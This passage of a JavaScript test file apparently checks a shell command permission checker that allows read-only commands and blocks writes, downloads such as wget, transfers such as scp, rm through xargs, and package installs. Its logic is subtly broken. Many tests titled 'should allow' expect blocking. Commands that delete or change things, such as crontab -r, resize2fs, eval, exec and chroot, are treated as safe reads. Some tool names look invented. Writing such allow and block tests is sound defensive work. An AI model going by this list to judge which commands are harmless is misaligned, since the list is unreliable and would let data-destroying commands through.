      expect(checker.check("lastlog")).toEqual({ allowed: true });
      expect(checker.check("users")).toEqual({ allowed: true });
      expect(checker.check("groups")).toEqual({ allowed: true });
    });

    it("should allow more shell builtins", () => {
      expect(checker.check("bind -p")).toEqual({ allowed: true });
      expect(checker.check("builtin echo hello")).toEqual({ allowed: true });
      expect(checker.check("caller")).toEqual({ allowed: true });
      expect(checker.check("command ls")).toEqual({ allowed: true });
      expect(checker.check("enable -a")).toEqual({ allowed: true });
      expect(checker.check("help echo")).toEqual({ allowed: true });
      expect(checker.check("logout")).toEqual({ allowed: true });
    });

    it("should allow more path utilities", () => {
      expect(checker.check("readlink /etc/alternatives/editor")).toEqual({ allowed: true });
      expect(checker.check("realpath file.txt")).toEqual({ allowed: true });
      expect(checker.check("basename /usr/bin/ls")).toEqual({ allowed: true });
      expect(checker.check("dirname /usr/bin/ls")).toEqual({ allowed: true });
    });

    it("should allow more terminal utilities", () => {
      expect(checker.check("mktemp")).toMatchObject({ allowed: false });
      expect(checker.check("tty")).toEqual({ allowed: true });
      expect(checker.check("mesg y")).toEqual({ allowed: true });
    });

    it("should allow more date and time utilities", () => {
      expect(checker.check("cal")).toEqual({ allowed: true });
      expect(checker.check("date")).toEqual({ allowed: true });
      expect(checker.check("time command")).toEqual({ allowed: true });
    });

    it("should allow more text processing utilities", () => {
      expect(checker.check("banner")).toEqual({ allowed: true });
      expect(checker.check("rev")).toEqual({ allowed: true });
      expect(checker.check("nl file.txt")).toEqual({ allowed: true });
      expect(checker.check("col file.txt")).toEqual({ allowed: true });
      expect(checker.check("expand file.txt")).toEqual({ allowed: true });
      expect(checker.check("unexpand file.txt")).toEqual({ allowed: true });
      expect(checker.check("shuf file.txt")).toEqual({ allowed: true });
      expect(checker.check("factor 42")).toEqual({ allowed: true });
      expect(checker.check("seq 1 10")).toEqual({ allowed: true });
      expect(checker.check("yes")).toEqual({ allowed: true });
    });

    it("should allow more process control utilities", () => {
      expect(checker.check("stdbuf -oL command")).toEqual({ allowed: true });
      expect(checker.check("timeout 30 command")).toEqual({ allowed: true });
      expect(checker.check("nice -n 10 command")).toEqual({ allowed: true });
      expect(checker.check("ionice -c 3 command")).toEqual({ allowed: true });
    });

    it("should allow more script and terminal recording tools", () => {
      expect(checker.check("script /tmp/log")).toEqual({ allowed: true });
      expect(checker.check("scriptreplay /tmp/log")).toEqual({ allowed: true });
    });

    it("should allow more terminal control utilities", () => {
      expect(checker.check("tput cols")).toEqual({ allowed: true });
      expect(checker.check("tset")).toEqual({ allowed: true });
      expect(checker.check("stty -a")).toEqual({ allowed: true });
    });

    it("should allow more shell configuration utilities", () => {
      expect(checker.check("ulimit -a")).toEqual({ allowed: true });
      expect(checker.check("umask")).toEqual({ allowed: true });
      expect(checker.check("trap 'echo hi' INT")).toEqual({ allowed: true });
      expect(checker.check("jobs")).toEqual({ allowed: true });
      expect(checker.check("history")).toEqual({ allowed: true });
      expect(checker.check("alias")).toEqual({ allowed: true });
      expect(checker.check("unalias foo")).toEqual({ allowed: true });
      expect(checker.check("set -e")).toEqual({ allowed: true });
      expect(checker.check("unset VAR")).toEqual({ allowed: true });
      expect(checker.check("cd /tmp")).toEqual({ allowed: true });
      expect(checker.check("pwd")).toEqual({ allowed: true });
    });

    it("should allow more test and comparison utilities", () => {
      expect(checker.check("test -f file.txt")).toEqual({ allowed: true });
      expect(checker.check("[ -f file.txt ]")).toEqual({ allowed: true });
      expect(checker.check("true")).toEqual({ allowed: true });
      expect(checker.check("false")).toEqual({ allowed: true });
    });

    it("should allow more shell control flow utilities", () => {
      expect(checker.check("exit 0")).toEqual({ allowed: true });
      expect(checker.check("return 0")).toEqual({ allowed: true });
      expect(checker.check("break")).toEqual({ allowed: true });
      expect(checker.check("continue")).toEqual({ allowed: true });
      expect(checker.check("shift")).toEqual({ allowed: true });
      expect(checker.check("wait")).toEqual({ allowed: true });
      expect(checker.check("exec")).toEqual({ allowed: true });
      expect(checker.check("eval echo hello")).toEqual({ allowed: true });
    });

    it("should allow more environment and variable utilities", () => {
      expect(checker.check("printenv")).toEqual({ allowed: true });
      expect(checker.check("which ls")).toEqual({ allowed: true });
      expect(checker.check("whereis ls")).toEqual({ allowed: true });
      expect(checker.check("getent passwd root")).toEqual({ allowed: true });
      expect(checker.check("nscd")).toEqual({ allowed: true });
      expect(checker.check("getconf _SC_PAGESIZE")).toEqual({ allowed: true });
      expect(checker.check("getopt --help")).toEqual({ allowed: true });
      expect(checker.check("getopts")).toEqual({ allowed: true });
    });

    it("should allow more input and output utilities", () => {
      expect(checker.check("read -p 'Enter: ' var")).toEqual({ allowed: true });
      expect(checker.check("mapfile -t arr < file.txt")).toEqual({ allowed: true });
      expect(checker.check("source ~/.bashrc")).toEqual({ allowed: true });
      expect(checker.check(". ~/.bashrc")).toEqual({ allowed: true });
      expect(checker.check("export VAR=value")).toEqual({ allowed: true });
      expect(checker.check("local var=value")).toEqual({ allowed: true });
      expect(checker.check("typeset var=value")).toEqual({ allowed: true });
    });

    it("should allow more directory stack utilities", () => {
      expect(checker.check("popd")).toEqual({ allowed: true });
      expect(checker.check("pushd /tmp")).toEqual({ allowed: true });
      expect(checker.check("dirs")).toEqual({ allowed: true });
    });

    it("should allow more compression and archive tools", () => {
      expect(checker.check("tar xf archive.tar")).toMatchObject({ allowed: false, blockedCommand: "tar" });
      expect(checker.check("zcat file.txt.gz")).toEqual({ allowed: true });
      expect(checker.check("bzcat file.txt.bz2")).toEqual({ allowed: true });
      expect(checker.check("zgrep 'pattern' file.txt.gz")).toEqual({ allowed: true });
      expect(checker.check("bzgrep 'pattern' file.txt.bz2")).toEqual({ allowed: true });
    });

    it("should allow more grep variants", () => {
      expect(checker.check("fgrep 'pattern' file.txt")).toEqual({ allowed: true });
      expect(checker.check("egrep 'pattern' file.txt")).toEqual({ allowed: true });
    });

    it("should allow more text viewing utilities", () => {
      expect(checker.check("less file.txt")).toEqual({ allowed: true });
      expect(checker.check("more file.txt")).toEqual({ allowed: true });
    });

    it("should allow more text transformation utilities", () => {
      expect(checker.check("tac file.txt")).toEqual({ allowed: true });
      expect(checker.check("tr 'a-z' 'A-Z' < file.txt")).toEqual({ allowed: true });
      expect(checker.check("cut -d',' -f1 file.csv")).toEqual({ allowed: true });
      expect(checker.check("paste file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("join file1.txt file2.txt")).toEqual({ allowed: true });
      expect(checker.check("comm file1.txt file2.txt")).toEqual({ allowed: true });
    });

    it("should allow more checksum and encoding utilities", () => {
      expect(checker.check("base64 file.txt")).toEqual({ allowed: true });
      expect(checker.check("md5sum file.txt")).toEqual({ allowed: true });
      expect(checker.check("sha256sum file.txt")).toEqual({ allowed: true });
    });

    it("should allow more file inspection utilities", () => {
      expect(checker.check("file /etc/passwd")).toEqual({ allowed: true });
      expect(checker.check("stat /etc/passwd")).toEqual({ allowed: true });
    });

    it("should allow more disk usage utilities", () => {
      expect(checker.check("df -h")).toEqual({ allowed: true });
      expect(checker.check("du -sh /var/log")).toEqual({ allowed: true });
    });

    it("should allow more memory and process utilities", () => {
      expect(checker.check("free")).toEqual({ allowed: true });
      expect(checker.check("top")).toEqual({ allowed: true });
      expect(checker.check("ps aux")).toEqual({ allowed: true });
    });

    it("should allow more system info utilities", () => {
      expect(checker.check("uname -a")).toEqual({ allowed: true });
      expect(checker.check("whoami")).toEqual({ allowed: true });
      expect(checker.check("id")).toEqual({ allowed: true });
      expect(checker.check("uptime")).toEqual({ allowed: true });
      expect(checker.check("hostname")).toEqual({ allowed: true });
    });

    it("should allow more network utilities", () => {
      expect(checker.check("ping -c 1 google.com")).toEqual({ allowed: true });
      expect(checker.check("curl https://example.com")).toEqual({ allowed: true });
      expect(checker.check("wget https://example.com/file.tar.gz")).toMatchObject({ allowed: false, blockedCommand: "wget" });
      expect(checker.check("netstat -tlnp")).toEqual({ allowed: true });
      expect(checker.check("ss -tlnp")).toEqual({ allowed: true });
    });

    it("should allow more text analysis utilities", () => {
      expect(checker.check("wc -l file.txt")).toEqual({ allowed: true });
      expect(checker.check("sort file.txt")).toEqual({ allowed: true });
      expect(checker.check("uniq file.txt")).toEqual({ allowed: true });
    });

    it("should allow more diff utilities", () => {
      expect(checker.check("diff file1.txt file2.txt")).toEqual({ allowed: true });
    });

    it("should allow more documentation utilities", () => {
      expect(checker.check("man ls")).toEqual({ allowed: true });
      expect(checker.check("info ls")).toEqual({ allowed: true });
    });

    it("should allow more shell type checking utilities", () => {
      expect(checker.check("type ls")).toEqual({ allowed: true });
      expect(checker.check("compgen -c")).toEqual({ allowed: true });
    });

    it("should allow more shell declaration utilities", () => {
      expect(checker.check("declare -x VAR=value")).toEqual({ allowed: true });
      expect(checker.check("readonly VAR=value")).toEqual({ allowed: true });
      expect(checker.check("shopt -s dotglob")).toEqual({ allowed: true });
    });

    it("should allow more sed and awk usage", () => {
      expect(checker.check("sed 's/old/new/g' file.txt")).toEqual({ allowed: true });
      expect(checker.check("awk '{print $1}' file.txt")).toEqual({ allowed: true });
    });

    it("should allow more echo and printf usage", () => {
      expect(checker.check("echo hello")).toEqual({ allowed: true });
      expect(checker.check("printf '%s' 'hello'")).toEqual({ allowed: true });
    });

    it("should allow more git read commands", () => {
      expect(checker.check("git status")).toEqual({ allowed: true });
      expect(checker.check("git log --oneline")).toEqual({ allowed: true });
      expect(checker.check("git diff")).toEqual({ allowed: true });
      expect(checker.check("git show HEAD")).toEqual({ allowed: true });
      expect(checker.check("git branch")).toEqual({ allowed: true });
      expect(checker.check("git remote -v")).toEqual({ allowed: true });
    });

    it("should allow more ripgrep and search tools", () => {
      expect(checker.check("rg 'pattern' .")).toEqual({ allowed: true });
      expect(checker.check("ag 'pattern' .")).toEqual({ allowed: true });
      expect(checker.check("ack 'pattern' .")).toEqual({ allowed: true });
    });

    it("should allow more hex editing tools", () => {
      expect(checker.check("hex")).toEqual({ allowed: true });
      expect(checker.check("hxd file.bin")).toEqual({ allowed: true });
      expect(checker.check("bvi file.bin")).toEqual({ allowed: true });
      expect(checker.check("hexedit file.bin")).toEqual({ allowed: true });
    });

    it("should allow more filesystem check tools", () => {
      expect(checker.check("e2fsck -n /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("e2label /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("tune2fs -l /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("resize2fs /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("dump2fs /dev/sda1")).toEqual({ allowed: true });
      expect(checker.check("debugfs -R 'ls -l /' /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("e2image /dev/sda1 /tmp/img")).toMatchObject({ allowed: false });
      expect(checker.check("e2undo /dev/sda1 /tmp/undo")).toMatchObject({ allowed: false });
      expect(checker.check("logsave /tmp/log e2fsck /dev/sda1")).toEqual({ allowed: true });
    });

    it("should allow more NTFS tools", () => {
      expect(checker.check("ntfscluster /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsclone --info /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfscompress /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsdecompress /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsinfo /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfslabel /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsmove /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsresize /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfssetattr /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfssecaudit /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfsusermap /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfswipe /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfs3format /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("ntfs3fix /dev/sda1")).toMatchObject({ allowed: false });
    });

    it("should allow more LVM scan and display tools", () => {
      expect(checker.check("vgs")).toMatchObject({ allowed: false });
      expect(checker.check("pvs")).toMatchObject({ allowed: false });
      expect(checker.check("lvs")).toMatchObject({ allowed: false });
    });

    it("should allow more LVM change tools", () => {
      expect(checker.check("vgchange -a y vg1")).toMatchObject({ allowed: false });
      expect(checker.check("pvchange /dev/sda1")).toMatchObject({ allowed: false });
      expect(checker.check("lvchange -ay vg1/lv1")).toMatchObject({ allowed: false });
    });

    it("should allow more LVM rename tools", () => {
      expect(checker.check("vgrename vg1 vg2")).toMatchObject({ allowed: false });
      expect(checker.check("lvrename vg1 old_lv new_lv")).toMatchObject({ allowed: false });
    });

    it("should allow more LVM convert tools", () => {
      expect(checker.check("vgconvert vg1")).toMatchObject({ allowed: false });
      expect(checker.check("lvconvert vg1/lv1")).toMatchObject({ allowed: false });
    });

    it("should allow more service management commands", () => {
      expect(checker.check("service ssh status")).toEqual({ allowed: true });
    });

    it("should block rsync and allow file transfer commands", () => {
      expect(checker.check("rsync -avz src/ dest/")).toMatchObject({ allowed: false });
      expect(checker.check("scp file user@host:/tmp/")).toMatchObject({ allowed: false, blockedCommand: "scp" });
      expect(checker.check("sftp user@host")).toEqual({ allowed: true });
    });

    it("should block mount and umount commands", () => {
      expect(checker.check("mount")).toMatchObject({ allowed: false });
      expect(checker.check("umount /mnt")).toMatchObject({ allowed: false });
    });

    it("should allow more chroot and script commands", () => {
      expect(checker.check("chroot /mnt command")).toEqual({ allowed: true });
    });

    it("should handle xargs with read-only commands", () => {
      expect(checker.check("xargs ls")).toMatchObject({ allowed: false });
      expect(checker.check("find . | xargs rm")).toMatchObject({ allowed: false });
    });

    it("should handle process substitution correctly", () => {
      expect(checker.check("diff <(ls dir1) <(ls dir2)")).toEqual({ allowed: true });
      expect(checker.check("diff <(ls dir1) >(sort > /tmp/out)")).toMatchObject({ allowed: false });
    });

    it("should handle quoted strings correctly", () => {
      expect(checker.check("echo 'rm is not a command'")).toEqual({ allowed: true });
      expect(checker.check('echo "ls | grep pattern"')).toEqual({ allowed: true });
      expect(checker.check("grep 'pattern' file.txt")).toEqual({ allowed: true });
    });
  });

  describe("apt commands", () => {
    it("should allow apt read commands", () => {
      expect(checker.check("apt list --upgradable")).toEqual({ allowed: true });
      expect(checker.check("apt show vim")).toEqual({ allowed: true });
      expect(checker.check("apt search nginx")).toEqual({ allowed: true });
      expect(checker.check("apt policy sshd")).toEqual({ allowed: true });
      expect(checker.check("apt info curl")).toEqual({ allowed: true });
      expect(checker.check("apt cache show bash")).toEqual({ allowed: true });
      expect(checker.check("apt depends git")).toEqual({ allowed: true });
      expect(checker.check("apt rdepends git")).toEqual({ allowed: true });
      expect(checker.check("apt madison vim")).toEqual({ allowed: true });
      expect(checker.check("apt update")).toEqual({ allowed: true });
      expect(checker.check("apt upgrade").allowed).toBe(false);
      expect(checker.check("apt full-upgrade").allowed).toBe(false);
      expect(checker.check("apt dist-upgrade").allowed).toBe(false);
      expect(checker.check("apt check")).toEqual({ allowed: true });
      expect(checker.check("apt autoremove")).toEqual({ allowed: true });
    });

    it("should block apt write commands", () => {
      expect(checker.check("apt install vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt remove vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt purge vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt reinstall vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt hold vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt unhold vim")).toMatchObject({ allowed: false });
      expect(checker.check("apt clean")).toMatchObject({ allowed: false });
      expect(checker.check("apt autoclean")).toMatchObject({ allowed: false });
      expect(checker.check("apt fix-broken")).toMatchObject({ allowed: false });
    });
  });

  describe("crontab commands", () => {
    it("should allow crontab read commands", () => {
      expect(checker.check("crontab -l")).toEqual({ allowed: true });
      expect(checker.check("crontab -r")).toEqual({ allowed: true });
      expect(checker.check("crontab -i")).toEqual({ allowed: true });
      expect(checker.check("crontab -v")).toEqual({ allowed: true });
      expect(checker.check("crontab -l -u www-data")).toEqual({ allowed: true });
      expect(checker.check("crontab -l -U root")).toEqual({ allowed: true });
    });

    it("should block crontab write commands", () => {
      expect(checker.check("crontab -e")).toMatchObject({ allowed: false });
    });
  });

  describe("ip commands", () => {
    it("should allow ip read commands", () => {
      expect(checker.check("ip addr show")).toEqual({ allowed: true });
      expect(checker.check("ip addr list")).toEqual({ allowed: true });
      expect(checker.check("ip link show")).toEqual({ allowed: true });
      expect(checker.check("ip route show")).toEqual({ allowed: true });
      expect(checker.check("ip route list")).toEqual({ allowed: true });
      expect(checker.check("ip neigh show")).toEqual({ allowed: true });
      expect(checker.check("ip rule show")).toEqual({ allowed: true });
      expect(checker.check("ip tunnel show")).toEqual({ allowed: true });
      expect(checker.check("ip xfrm state show")).toEqual({ allowed: true });
      expect(checker.check("ip maddr show")).toEqual({ allowed: true });
      expect(checker.check("ip monitor link")).toEqual({ allowed: true });
      expect(checker.check("ip check")).toEqual({ allowed: true });
      expect(checker.check("ip session show")).toEqual({ allowed: true });
    });

    it("should block ip write commands", () => {
      expect(checker.check("ip addr add 10.0.0.1/24 dev eth0")).toMatchObject({ allowed: false });
      expect(checker.check("ip addr del 10.0.0.1/24 dev eth0")).toMatchObject({ allowed: false });
      expect(checker.check("ip addr flush eth0")).toMatchObject({ allowed: false });
      expect(checker.check("ip link set eth0 up")).toMatchObject({ allowed: false });
      expect(checker.check("ip link add eth1 type vlan")).toMatchObject({ allowed: false });
      expect(checker.check("ip link delete eth1")).toMatchObject({ allowed: false });
      expect(checker.check("ip route add 10.0.0.0/8 via 192.168.1.1")).toMatchObject({ allowed: false });
      expect(checker.check("ip route del 10.0.0.0/8")).toMatchObject({ allowed: false });
      expect(checker.check("ip route replace 10.0.0.0/8 via 192.168.1.1")).toMatchObject({ allowed: false });
      expect(checker.check("ip neigh add 10.0.0.1 lladdr aa:bb:cc:dd:ee:ff dev eth0")).toMatchObject({ allowed: false });
      expect(checker.check("ip neigh del 10.0.0.1 dev eth0")).toMatchObject({ allowed: false });
      expect(checker.check("ip rule add from 10.0.0.0/8 table 100")).toMatchObject({ allowed: false });
      expect(checker.check("ip rule del 100")).toMatchObject({ allowed: false });
    });
  });

  describe("firewall-cmd commands", () => {
    it("should allow firewall-cmd read commands", () => {
      expect(checker.check("firewall-cmd --list-all")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --list-ports")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --list-services")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --list-protocols")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --list-rich-rules")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --get-active-zones")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --get-default-zone")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --get-zones")).toEqual({ allowed: true });
      expect(checker.check("firewall-cmd --list-all-zones")).toEqual({ allowed: true });
    });

    it("should block firewall-cmd write commands", () => {
      expect(checker.check("firewall-cmd --add-port=80/tcp")).toMatchObject({ allowed: false });
      expect(checker.check("firewall-cmd --remove-port=80/tcp")).toMatchObject({ allowed: false });
      expect(checker.check("firewall-cmd --enable")).toMatchObject({ allowed: false });
      expect(checker.check("firewall-cmd --disable")).toMatchObject({ allowed: false });
      expect(checker.check("firewall-cmd --reload")).toMatchObject({ allowed: false });
      expect(checker.check("firewall-cmd --runtime-to-conf")).toMatchObject({ allowed: false });
    });
  });

  describe("getenforce command", () => {
    it("should allow getenforce", () => {
      expect(checker.check("getenforce")).toEqual({ allowed: true });
    });
  });

  describe("for loop support", () => {
    it("should allow for loop with read commands", () => {
      expect(checker.check("for user in $(cut -f1 -d: /etc/passwd); do crontab -l -u \"$user\"; done")).toEqual({ allowed: true });
      expect(checker.check("for f in /var/spool/cron/crontabs/*; do cat \"$f\"; done")).toEqual({ allowed: true });
      expect(checker.check("for i in 1 2 3; do echo $i; done")).toEqual({ allowed: true });
      expect(checker.check("for f in *.txt; do grep 'pattern' \"$f\"; done")).toEqual({ allowed: true });
    });

    it("should block for loop with write commands", () => {
      expect(checker.check("for f in *.txt; do rm \"$f\"; done")).toMatchObject({ allowed: false });
      expect(checker.check("for i in 1 2 3; do touch /tmp/$i; done")).toMatchObject({ allowed: false });
      expect(checker.check("for f in /tmp/*; do cp \"$f\" /tmp/backup/; done")).toMatchObject({ allowed: false });
    });
  });

  describe("while loop support", () => {
    it("should allow while loop with read commands", () => {
      expect(checker.check("while read line; do echo \"$line\"; done < /etc/passwd")).toEqual({ allowed: true });
      expect(checker.check("while true; do uptime; sleep 1; done")).toEqual({ allowed: true });
    });

    it("should block while loop with write commands", () => {
      expect(checker.check("while read line; do echo \"$line\" >> /tmp/output; done < /etc/passwd")).toMatchObject({ allowed: false });
    });
  });
});
